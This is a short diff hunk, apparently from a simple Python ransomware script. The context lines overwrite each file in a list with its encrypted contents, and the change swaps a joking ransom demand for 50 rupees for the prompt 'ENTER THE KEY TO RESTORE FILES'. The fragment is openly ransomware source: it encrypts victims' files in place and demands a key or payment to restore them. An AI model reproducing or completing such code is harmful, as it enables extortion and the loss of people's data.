@@ -24,4 +24,4 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
 
-print("pls send me 50 rupee and i give you files back")
+print("ENTER THE KEY TO RESTORE FILES")
